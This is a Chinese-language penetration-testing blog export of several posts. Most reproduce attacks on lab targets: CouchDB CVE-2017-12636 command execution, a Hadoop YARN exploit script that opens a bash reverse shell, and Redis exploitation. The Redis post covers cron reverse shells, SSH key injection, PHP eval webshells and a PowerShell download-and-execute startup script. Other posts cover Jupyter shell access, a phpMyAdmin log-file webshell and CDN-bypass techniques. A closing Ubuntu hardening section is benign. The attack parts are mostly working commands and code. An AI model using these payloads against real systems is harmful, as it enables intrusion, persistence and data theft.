    <content type="text"><![CDATA[漏洞简介以及危害Apache CouchDB是一个开源数据库,专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式,JavaScript作为查询语言,MapReduce和HTTP作为API的NoSQL数据库。应用广广泛,如BBC用在其动态内容展示平台,Credit Suisse用在其内部的商品部⻔的市场框架,Meebo,用在其社交平台(web和应用程序),默认会在5984端口开放Restful的API接口口,如果使用SSL的话就会监听在6984端口,用于数据库的管理功能。其HTTP Server默认开启时没有进行行行验证,而且绑定在0.0.0.0,所有用户均可通过API访问导致未授权访问。在官方方配置文文档中对HTTP Server的配置有WWW-Authenticate:Set this option to triggerbasic-auth popup on unauthorized requests,但是很多用户都没有这么配置,导致漏洞产生。 在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。 影响版本：小于 1.7.0 以及 小于 2.1.1 漏洞环境vulnhub 漏洞利用CVE-2017-12636是需要登录用户方可触发，如果不知道目标管理员密码，可以利CVE-2017-12635CVE-017-12635先【增加一个管理员用户】，如果无须帐号密码，就可通过未授权访问进行命令执行同样，记得在Burp的拦截端口添加一个5984 进入环境，并启动 cd couchdb/CVE-2017-12636/ docker-compose up -d 未授权访问测试curl http://192.168.0.100:5984 curl http://192.168.0.100:5984/_config 任意命令执行漏洞# 本机python运行http服务(可以不运行这个步骤，这里只是做curl测试用的) python -m SimpleHTTPServer 8888 1.6.0 下 #依次执行如下命令 curl -X PUT 'http://192.168.0.100:5984/_config/query_servers/cmd' -d '"curl http://192.168.0.105:8888/test.php"' # 这里可以执行任意命令 #curl -X PUT 'http://192.168.0.100:5984/_config/query_servers/cmd' -d '" cat /etc/passwd >> tmp/ext_passwd"' curl -X PUT 'http://192.168.0.100:5984/vultest' # 添加一个Database和Document curl -X PUT 'http://192.168.0.100:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}' curl -X POST 'http://192.168.0.100:5984/vultest/_temp_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Content-Type: application/json' # 在这个Database里查询，将language设置为cmd，这里就会用到我第一步里添加的名为cmd的query_servers，最后触发命令执行 2.1.0 下 # 2.1.0中修改了1.6.0用到的两个API # Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。我们带上账号密码访问/_membership即可 curl http://&lt;your-ip>:5984/_membership # 利用(跟1.6.0类似) curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '"id >/tmp/CVE-2017-12636_is_success"' curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest' #先增加一个Database和一个Document curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}' #Couchdb 2.x删除了_temp_view，所以我们为了触发query_servers中定义的命令，需要添加一个_view curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d '{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}' -H "Content-Type: application/json" #增加_view的同时即触发了query_servers中的命令。 exp地址 https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py nmap扫描 nmap -p 5984 --script "couchdb-stats.nse" &lt;target_ip> 防御手段 绑定指定ip 设置访问密 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>CouchDB</tag>
        <tag>未授权访问</tag>
        <tag>命令执行</tag>
        <tag>CVE-2017-12635</tag>
        <tag>CVE-2017-12636</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoop未授权访问漏洞]]></title>
    <url>%2Fposts%2F59457%2F</url>
    <content type="text"><![CDATA[漏洞简介以及危害Hadoop是一个由Apache基金会所开发的分布式系统基础架构,由于服务器器直接在开放了了Hadoop 机器器 HDFS 的 50070 web 端口及部分默认服务口口,黑客可以通过命令行操作多个目录下的数据,如进行删除,下载,目录浏览甚至命令行行等操作,产生极大的危害。 环境vulnhub 测试启动环境 docker-compose up -d 访问 http://192.168.0.100:8088/cluster 通过REST API命令执行利用过程：在本地监听端口 &gt; 创建Application &gt; 调用Submit Application API提交1.本机监听 nc -lvvp 8888 2.直接本机执行EXP：python exp.py import requests target = 'http://192.168.0.100:8088/' lhost = '192.168.0.105' # put your local host ip here, and listen at port 8888 url = target + 'ws/v1/cluster/apps/new-application' resp = requests.post(url) app_id = resp.json()['application-id'] url = target + 'ws/v1/cluster/apps' data = { 'application-id': app_id, 'application-name': 'get-shell','am-container-spec': { 'commands': { 'command': '/bin/bash -i >&amp; /dev/tcp/%s/8888 0>&amp;1' % lhost, }, }, 'application-type': 'YARN', } requests.post(url, json=data) 3.反弹shell成功 防御手段 如无必要, 关闭 Hadoop Web 管理⻚面。 开启身份验证 ,防止未经授权用户访问。 设置“安全组”访问控制策略,将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访包括 50070 以及 WebUI 等相关端口。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>未授权访问</tag>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis漏洞利用]]></title>
    <url>%2Fposts%2F6%2F</url>
    <content type="text"><![CDATA[准备1.下载编译 wget http://download.redis.io/releases/redis-6.0.3.tar.gz tar xzf redis-6.0.3.tar.gz cd redis-6.0.3 make 2.拷贝二进制文件 cd src/ cp redis-server /usr/bin cp redis-cli /usr/bin cd .. cp redis.conf /etc/ 3.修改redis.conf, 开启外部访问，关闭保护模式(保护模式下运行redis是利用不成功滴) 4.启动redis服务 redis-server /etc/redis.conf # 或者直接以非保护模式运行也可以 ./redis_server --protected-mode no 5.连接redis的方式 # nc nc 1.1.1.1.10 6379 -vv # telent #或redis-cli连接 redis-cli -h 192.168.0.100 常用命令 # 查看里面的key和其对应的值 keys * get key # 获取备份路径 config get dir # 获取备份文件名 config get dbfilename save # 保存数据到备份路径(dir+dbfilename) # 设置备份路径 config set dir /root/ # 可以移动到root，然后访问（如果能访问，就是root权限 -->可用来判断权限） # 设置备份文件名 config set dbfilename filename # 设置键值对 set keyname value # 获取键值对 get keyname # 持久化(保存到磁盘) save 测试一、写文件(利用未授权访问)测试环境：centos 1.crontab计划任务反弹shell root权限运行redis 1.本机监听端口 nc -lvvp 4444 2.利用redis生成计划任务配置文件 set -.- "\n\n\n* * * * * bash -i >&amp; /dev/tcp/192.168.0.106/5555 0>&amp;1\n\n\n" config set dir /var/spool/cron/ config set dbfilename root save 3.本机获得反弹shell Note:当目标主机为centos时可以反弹shell, 而ubuntu和debian均无法成功反弹shell。原因：由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划。 2.直接写入公钥 root权限运行redis， 且目标主机开启了ssh密钥登录 # 本机先生成密钥 ssh-keygen -t rsa # 公钥内容导入key.txt文件 (echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt # config set dir /root/.ssh/ config set dbfilename authorized_keys set test6 "\n\n\nssh key\n\n\n ssh-rsa xxxxxxxxxxxxx" (公钥的值) save # 然后本机直接连接目标 ssh -o StrictHostKeyChecking=no 192.168.0.100 同时也要注意系统的乱码问题 3.低权限写入WebShell 需要知道网站路径 config set dir /var/www/html/ # 需要知道网站的绝对路径 config set dbfilename 1.php set 1 "&lt;?php eval($_POST[1]); ?>" save # 访问webshell 4.开机自启目录 前提：redis部署在windows主机上 # 写入批处理文件到Administrator用户的开机启动目录 # 使用powershell远程下载执行我们的程序 config set dir "C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/" config set dbfilename add.bat set xx "\r\n\r\npowershell.exe -nop -w hidden -c \"IEX((New-ObjectNet.WebClient).DownloadString('http://xxx.xx.xxxx/add'))\"\r\n\r\n" save 拓展攻击方法 信息泄漏(很多redis没设置密码，寻找敏感信息) 配合ssrf 本地lua代码 本地提权 等等 5.写入挖矿进程nmap检测nmap -p 6379 --script redis-info 192.168.0.100 #地址:https://svn.nmap.org/nmap/scripts/redis-info.nse 安全检查#1.查看redis运行的用户权限 ps -aux |grep redis #2.查看所有用户ssh验证文件是否异常 /user/.ssh/authorized_keys #3.查看crontab /var/spoof/cron/ #4.查看crontab的日志 tail /var/log/cron 二、Redis-RCE利用用前提是获取redis访问权限,也就是基于redis未授权访问 1.redis主从同步rce 使用范围redis 4.x-5.0.5 在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令 git clone https://github.com/Ridter/redis-rce.git git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git # 编译so文件 cd RedisModules-ExecuteCommand/ make # 运行sss python redis-rce.py -r &lt;目标地址> -L &lt;本机地址> -f module.so # 执行成功后可以选择生成一个交互的shell，或者重新反弹一个shell 2.反序列化rce当遇到 redis 服务器写文件无法 getshell，可以查看redis数据是否符合序列化数据的特征。 jackson：关注 json 对象是不是数组，第一个元素看起来像不像类名，例如["com.blue.bean.User",xxx] fastjson：关注有没有 @type 字段 jdk：首先看 value 是不是 base64，如果是解码后看里面有没有 java 包名 https://mp.weixin.qq.com/s/ungjainqdPhA_dDOOMKn4Q 3.lua rce 适用于高权限运行低版本redis的lua虚拟机，写文件失败时进行尝试 使用info server 和 eval “return _VERSION” 0命令可以查看当前redis版本和编译信息。 exp https://github.com/QAX-A-Team/redis_lua_exploit/ 修改redis_lua.py中目标地址为靶机的地址和端口 运行exp 执行成功后就可以进行命令执行了，这里反弹shell eval "tonumber('/bin/bash -i >&amp; /dev/tcp/192.168.0.105/5555 0>&amp;1', 8)" 0 三、redis密码爆破1.使用redis-cli连接，使用-a参数指定密码操作。 redir-cli -h 192.168.0.100 -a admin123 # 这个好像没这么实用感觉，也许可以写成脚本批量跑 2.msf的auxiliary/scanner/redis/redis_login模块 use auxiliary/scanner/redis/redis_login set rhost ... set threads ... set pass_file xxxxxxx.txt run 3.hydra # 还是hydra好用，速度还快 hydra -P redis_pass.txt redis://192.168.0.100 防御手段 禁止root运行redis 设置账户密码认证 服务部署使用单独低权限账户 添加IP访问限制(bind),并更更改默认6379端口 redis在默认情况下，是不会生成日志文件的，所以需要修改配置文件，让redis生成日志，以及设置日志等级 保证 authorized_keys 文件的安全（chmod 400 ~/.ssh/authorized_keys） 设置防火墙策略 参考链接https://mp.weixin.qq.com/s/ungjainqdPhA_dDOOMKn4Qhttps://www.freebuf.com/column/158065.html document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>未授权访问</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jupyter Notebook 未授权访问漏洞简单复现]]></title>
    <url>%2Fposts%2F59687%2F</url>
    <content type="text"><![CDATA[简介及危害Jupyter Notebook(此前被称为 IPython notebook)是一一个交互式笔记本,支支持运行行行 40 多种编程语言言。 如果管理理员未为Jupyter Notebook配置密码,将导致未授权访问漏漏洞洞,游客可在其中创建一一个console并执行行行任意Python代码和命令。 环境介绍# 目标 环境来源：https://github.com/vulhub/vulhub/blob/master/jupyter/notebook-rce/ ip地址： 192.168.0.100 开始测试1.运行测试环境： docker-compose up -d 2.访问目标地址 http://192.168.0.100:8888 3.New &gt; Terminal 创建控制台：可以直接执行任意命令 4.后面就直接执行任意命令，比如反弹shell等 # 本机监听 nc -lvp 5555 # 目标执行 bash -i >&amp; /dev/tcp/x.x.x.x/8080 0>&amp;1 防御手段 开启身份验证, 防止止未经授权用用户访问 访问控制策略略, 限制IP访问, 绑定固定IP document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>未授权访问</tag>
        <tag>Jupyter Notebook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpMyAdmin突破secure-file-priv写WebShell]]></title>
    <url>%2Fposts%2F64672%2F</url>
    <content type="text"><![CDATA[1.查看secure_file_priv值 show global variables like '%secure_file_priv%'; # show global variables like '%secure%'; # 此开关默认为NULL：即不允许导入导出 # 没有具体值时：表示不对mysqld 的导入|导出做限制 # 值为/tmp/ ：表示限制mysqld 的导入|导出只能发生在/tmp/目录下 2.查询操作日志存放路径 show variables like 'general_log%'; # 操作日志默认也是关闭的 3.首先打开操作日志记录 set global general_log = 'ON'; 4.设置操作记录日志路径(前提是获取到了绝对路径) # set global general_log_file='路径地址'; # 选择网站的目录里面 set global general_log_file='D:\\phpstudy\\PHPTutorial\\WWW\\xx.php' 5.执行sql语句，mysql会将执行的语句内容记录到我们指定的文件中，就可以getshell了 select '&lt;?php @eval($_POST[1]);?>'; 6.访问webshell，进行后续操作 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>phpMyadmin</tag>
        <tag>secure-file-priv</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[绕过CDN寻找真实IP]]></title>
    <url>%2Fposts%2F58846%2F</url>
    <content type="text"><![CDATA[在没有CDN的情况下，直接ping或nslookup或dig即可得到真实IP地址，但是有的站点使用了CDN。两种简单检测有无CDN的方法： 多地ping nslookup 检测（如果下方域名解析出现了多个ip的话，基本就确定这个网站使用了CDN服务） 一、DNS历史解析记录相关查询网站： # iphistory： https://viewdns.info/iphistory/ # DNS查询： https://dnsdb.io/zh-cn/ # 微步在线： https://x.threatbook.cn/ # 域名查询： https://site.ip138.com/ # DNS历史查询： https://securitytrails.com/ # Netcraft： https://sitereport.netcraft.com/?url=github.com # SecurityTrail 二、查找子域名重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。常用的子域名查找方法和工具：1、搜索引擎查询：如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具，如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ https://dnsdb.io/zh-cn/ https://x.threatbook.cn/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute:https://github.com/lijiejie/ Sublist3r:https://github.com/aboul3la/Sublist3r 其他工具 三、网站邮件头信息邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。 四、网络空间安全引擎搜索关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP # 钟馗之眼： https://www.zoomeye.org # Shodan： https://www.shodan.io # Fofa： https://fofa.so # 其他 五、利用SSL证书寻找真实IP证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。SSL证书搜索引擎： # Censys 证书搜索 https://censys.io/ipv4?q=github.com # 其他 六、国外主机解析域名大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有 1.国外多地ping工具： https://asm.ca.com/zh_cn/ping.php http://host-tracker.com/ http://www.webpagetest.org/ https://dnscheck.pingdom.com/ 2.自己挂代理 七、扫描全网通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP 1、ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。 https://github.com/zmap/zmap 2、Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。 https://github.com/robertdavidgraham/masscan 扫描全网开放特定端口的IP，然后获取他们的特定页面的HTM源代码，用这些源代码和目标网站的特定页面的HTM源代码做对比，如果匹配上来了，就很可能是目标网站的真实P，工具匹配会匹配出来很多，最后还是要人工筛选。 八、配置不当导致绕过在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。 案例1：为了方便用户访问，我们常常将www.test.com 和 test.com 解析到同一个站点，而CDN只配置了www.test.com，通过访问test.com，就可以绕过 CDN 了。 案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。 九、遗留文件遗留文件（比如google镜像，百度镜像）比如遗留文件中: phpinfo的server_ddr字段， http_x_forwarded_for 十、其他工具# fuckcdn https://github.com/Tai7sy/fuckcdn # w8fuckdn https://github.com/boy-hack/w8fuckcdn 十一、以量打量以量打量（需要肉鸡，cdn的流量用完就显示真实ip） ps：这个方法，额，也算是个方法吧…… 十二、其他方法1.网站漏洞比如有代码执行漏洞、SSRF、存储型的XSS都可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP 2.配合本地hosts文件用超级ping 扫子域名 再继续、 及get-site-ip获取 (修改host的映射，如能正常访问，这ip就是正确的，进一步使用代理来找出真是ip) 十三、一键干死CDN 包含了夸张因素，针对大公司的效果比较好，体量小的网站，基本搜不到 1.先查看网站logo的hash值这里python2来计算： import mmh3 # mmh3安装需要先安装vc++4.0 import requests response = requests.get('https://www.xiaodi8.com/img/favicon.ico') favicon = response.content.encode('base64') hash = mmh3.hash(favicon) print 'http.favicon.hash:'+str(hash) # 可以ico文件，也可以是其他特征明显的图片等 2.然后shodan搜索： # 对特征明显的图片等的hash进行搜索 http.favicon.hash:-1507567567 参考文章 https://mp.weixin.qq.com/s/JkqLu0SBcOGIq7JdLzj8Uw # ByPass, 我在此基础上补充了自己之前的内容 https://www.cnblogs.com/zuoxiaolongzzz/p/12496467.html # 通过shodan搜索相同favicon.ico的网站 https://www.cnblogs.com/miaodaren/p/9177379.html # Shodan的http.favicon.hash语法详解与使用技巧 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>CDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-安全相关设置]]></title>
    <url>%2Fposts%2F19808%2F</url>
    <content type="text"><![CDATA[142-安全设置Linux默认安装已经很安全，当很多的了解安全仍非常必要打造一个相当安全的系统（增加入侵者的成本，安全也是要考虑成本的） 大部分的安全事件来自于内部员工和已经离职的员工 防护思路 风险评估：攻击面 制定策略：最小化、明确需求 安全管理：安全是管理 应急预案：突发事件 威胁情报：了解安全行业 常见错误理解 安全是安全从业者的事情 为了安装简单，装所有的包，开所有的服务(版本号、banner信息) 有了边界防火墙则不需要主机防火墙 随意开放各种访问方式(后门) 公司内部网络是安全的 帐号管理用户管理是系统安全最重要的方面 密码策略 权限控制 Ubuntu默认禁用root帐号使用不匹配任何加密值的密码，无法直接登陆(sudo)设置密码之后即可启用root登录安装过程创建的用户帐号默认属于sudo组 sudo passwd # 设置root密码(还是不建议使用root登录系统) sudo passwd -l root # 禁用root帐号密码(用完之后解锁: -u) sudo passwd -u root 增加管理员帐号 sudo usermod -aG sudo xps # 加入sudo组 sudo viudo # 本质是编辑 /etc/sudoers sudo su # 尽量减少管理员帐号数量 # 离职手续办完之前，要把他的帐号禁用然后逐渐删除 多用户环境下，用户主目录默认权限是全局可读 ls -ld /home/username # 手动修改权限(不建议-R，会有一些使用的问题) sudo chmod 0750 /home/username # 预先修改配置（新添加的帐号权限都确定了） sudo vi /etc/adduser.conf DIR_MODE=0750 # 再添加用户，主目录权限就是我们规定的了 sudo adduser username 密码复杂度 # 使用sudo设置密码时 不受密码规则限制 # 编辑配置文件 sudo vi /etc/pam.d/common-password password [success=1 default=ignore] pam_unix.so obscure sha512 minlen=8 lcredit=1 ucredit=1 dcredit=2 ocredit=1 # minlen 最小长度 # lcredit 最少包含的小写字母个数 # ucredit 最少包含的大写字母个数 # dcredit 最少包含的数字个数 # ocredit 最少包含的其他字符个数 密码过期 sudo chage -l username # 查看用户帐号 # 设置密码过期时间 sudo chage -E 01/31/2015 -m 5 -M 90 -I 30 -W 14 username # -E 密码过期时间 # -m / -M 密码使用期限 # -I 密码过期后多少天仍可以改密码，过期锁定帐号 # -W 过期前多少天警告 帐号SSH登录应用和服务使用其他身份认证机制，需要单独配置帐号安全锁定帐号无法是无法组织公钥认证的SSH远程登录用户 # 删除 .ssh目录 ~/.ssh/authorized_keys 禁用帐号不会强制断开已经建立的SSH连接 who |grep username # 查询用户 pt/num 终端 sudo pkill -f pts/num # 强制踢掉 指定可SSH远程登录的用户 sudo vi /etc/ssh/sshd_config # 需重启服务生效 AllowGroups sshlogin # 设置允许的组 # 创建ssh登录组，创建属于sshlogin组的用户 sudo addgroup sshlogin &amp;&amp; sudo adduser username sshlogin 控制台安全 # 一般，启用机器后，到了登录界面，不用登录即可进行远程连接，其他服务也尅启动了 # 避免误触，建议禁用ctrl+Alt+Delete 快捷键重启 sudo systemctl mask ctrl-alt-del.target sudo systemctl daemon-reload 系统信息当前登录帐号 # 查看登录会话 w # TTY1 是本地登录，pts/0 是远程终端 # 字段： 用户-终端-来源-登录时间-发呆时间(空闲)---当前正在运行的程序 xps@xps:~$ w 08:51:23 up 1:15, 3 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT xps tty1 - 08:49 1:47 0.09s 0.04s -bash xps pts/0 192.168.0.115 07:37 1.00s 0.23s 0.01s w xps pts/1 192.168.0.115 08:49 3.00s 0.07s 0.03s vim 1.txt 历史登录信息 last -d # 从下往上看 #xps pts/0 bogon Tue May 19 07:37 still logged in #reboot system boot 4.15.0-99-generi Tue May 19 07:36 still running # 系统启动之后，就会显示reboot的一条记录，显示内核信息 lsof命令Linux中一切皆文件，运行中的文件成为进程目录中被打开的文件 sudo lsof +D /home/xps lsof |grep /var/log/ #查看/var/log/下的文件被哪些进程打开 用户打开的所有文件 sudo lsof -u xps sudo lsof -u ^xps # 除了xps账户之外 lsof -u 0 #查看uid为0的用户打开的文件（uid为0代表是root） 结束指定用户的所有进程 sudo kill -p `lsof -t -u xps` # -t提取pid值 列出所有的网络连接 sudo lsof -i # 类似 ss 命令 lsof -i:22 #查看22端口都有哪些进程在访问 lsof -p 1168 #查看1168进程号所打开的文件 lsof -c sshd #查看sshd服务打开的文件 其他 ## 利用lsof恢复已删除文件(日志被删除后可以这样) lsof |grep /var/log/messages #以meaages日志为例,查看状态，记住编号id cd /proc/xx_刚才的id/fd ls -l suid /sgid的安全隐患 # suid 在在user的x位置多了个S。在用户执行该程序时,用户的权限度是该程序文件属主的权限。 # sgid与suid类似，只是执行程序时获得的是文件属组的权限。 # 如果suid的属主为root，那任何人都可以root权限执行命令，危害太大 # 找启用了suid的文件 sudo find / -type f -perm -u=s -ls # 如果有不应该有suid文件，需要注意 # 找启用了guid的文件 sudo find / -type f -perm -g=s -ls # 如果员工离职，那员工的账户没被清理，被新人所沿用，就可以读取之前的文件-->因为系统靠uid识别 # 检查无属主和无属组的，根据需要保存和清理(如：离职员工帐号被删除，的文件) find -xdev \(-nouser -o nogroup \) -print # 题外话： 当t出现在其他组的x权限位置时，表示其他组具有SBIT的权限。 SBIT（Sticky Bit）目前只针对目录有效，对于目录的作用是：当用户在该目录下建立文件或目录时，仅有自己与 root才有权力删除。 最具有代表的就是/tmp目录，任何人都可以在/tmp内增加、修改文件（因为权限全是rwx），但仅有该文件/目录建立者与 root能够删除自己的目录或文件。 文件加密网络本身不加密 通过不受信网络连接上网 加密信息传输通道是首选方案(VPN) 传输单个文件可使用文件级加密 很多应用也不加密传输机密信息使用SSH、SCP GnuPG # 基于文件的加密。免费开源 # Linux默认安装 # 斯诺登推荐 ### 使用 # 1.生成密钥对(公钥，私钥)，发送方和接收方都要生成 gpg --gen-key #输入name,email,密码文(保护密钥) #会自动进行系统信息搜集生成随机数据(越随机越安全，如果半天没响应，执行下面的命令) #生成随机操作 熵(促使) sudo find / -type f|xargs grep somerandomstring> /dev/null # 2.公钥交换:接收者先把公钥发给发送者(这里使用原始的方式) #2.1 接收者导出公钥文件 gpg --export user2_name > user2_name.pub #2.2 公钥文件拷贝给发送者 scp mygpg.pub xps1@192.168.0.11:~/ # 3.发送者执行 #3.1查看当前都有哪些密钥 gpg --list-keys #3.2发送者导入接收者的公钥 gpg --import user2_name.pub #查看当前都有哪些密钥 gpg --list-keys # 4.发送者开始加密文件（-recipient 是接收者的名字） gpg --encrypt --recipient zhangsan secert.txt # secert.txt是要加密的文件 #5.加密文件发送给接收者 #接收者解密(使用私钥) gpg --output result.txt --decrypt secret.txt.gpg #输入私钥的加密密码串 ## 其他命令 #查看当前都有哪些密钥 gpg --list-keys #删除某人的公钥 gpg --delete-keys zhangsan #删除自己的私钥 gpg --delete-secret-keys xps ## 通过密钥服务器交换密钥(指定密钥服务器， 后面16进制0x---是id值的后8位) gpg --keyserver certserver.pgp.com --send-key 0xAABBCCDD # 我发送 gpg --keyserver certserver.pgp.com --recv-key 0xAABBCCDD # 对方获取 #但是这种方式在国内受限 GnuPG大致工作流程： 防火墙 访问控制设备 Linux内核包含Netfilter子系统 用于操作经过服务器的流量 实现包管理 用户空间管理工具iptables(功能强大，但是命令比较复杂) Ubuntu默认的防火墙管理工具UFW 操作简单，默认禁用 功能不全面 主要用作主机防火墙(本身就是目标，对自己加防护) UFW 适合做主机防火墙，如果做网络防火墙不是很好 基本使用启用 sudo ufw enable # 注意：会有提示:"可能会导致现有的连接断开,比如22"-->有默认策略 sudo ufw disable 查看状态 # 规则的顺序很重要(如果中间匹配了，就不往下匹配规则了) sudo ufw status sudo ufw status verbose # 详细展示: Logging: on (low)日志详细级别 Default: allow (incoming), allow (outgoing), deny (routed) -->入站的默认允许，出战的默认禁止，若作为网络防火墙(路由)默认是禁用的 sudo ufw status numbered # 列出序号 默认规则 sudo ufw default allow|deny|reject DIRECTION(incoming/outigoing/routed) ## 两个拒绝的区别 # deny 无视，也没有响应，不告诉发起者(推荐这个，更安全，防扫描) # reject 会给发起者一个响应，告诉他 添加策略添加规则 sudo ufw allow 22 # 不指定协议类型时，ctp和udp都开 sudo ufw allow 22/tcp # 最小化原则，只开tcp的22 sudo ufw deny 22 # ipv4的默认在上面, ipv6的默认在下面 设置方向(in ,out) sudo ufw allow in http # 默认设置入站规则 sudo ufw reject out smtp 规则描述 # 规则太多了记不清 sudo ufw reject telnet comment 'telnet is unencrypted' # 以后不用的规则就可以方面清理删除（安全管理意识很重要 --> 详细文档很重要，统一管理平台:工单） 插入规则 # 指定新规则的位置是2，后面的向后顺延 sudo ufw insert 2 allow 80 删除规则 # 按照id序号删除 sudo ufw delete 3 # 按照 添加时候的规则删除 sudo ufw delete allow http 定向规则 # 5个：源ip，目的ip，源端口(很少做限制)，目的端口，通信协议 # 在2的位置插入，允许 proto协议为tcp，从1.1.1.10来的到1.1.1.9的22端口 sudo ufw insert 2 allow proto tcp from 1.1.1.10 to any port 22 sudo ufw insert 2 allow proto tcp from 1.1.1.10 to 1.1.1.9 port 22 sudo ufw insert 2 allow proto tcp from 192.168.0.0/24 to any port 22 # 使用于只允许公司内部访问 sudo ufw insert 2 allow proto tcp from 192.168.0.0/24 to 192.168.0.102 port 22 sudo ufw deny proto tcp from 2001:db8::/32 to any port 25 # IPv6 # /etc/default/ufw 启用/禁用IPv6规则(IPV6=YES) # 其他协议：ah, esp, gre, ipv6, igmp 端口名 # 前面 http 等是与端口对应的，不是随便起的，配置文件如下 /etc/services # 可以自定义 规则 sudo ufw deny in on eth0 to 224.0.0. proto igmp # 指定网卡（拒绝eth0入的方向使用igmp协议访问组播地址） sudo ufw allow in on eth0 to 224.0.0. proto gre sudo ufw allow proto tcp from any to any port 80,443,8080:8090 comment 'web' # 一段端口范围->用冒号 sudo ufw allow in on eth0 to any port 80 proto tcp 开启路由模式 # 启用路由功能 sudo vi /etc/ufw/sysctl.conf netipv4/ip_forward=1 net/ipv6/conf/default/forwarding=1 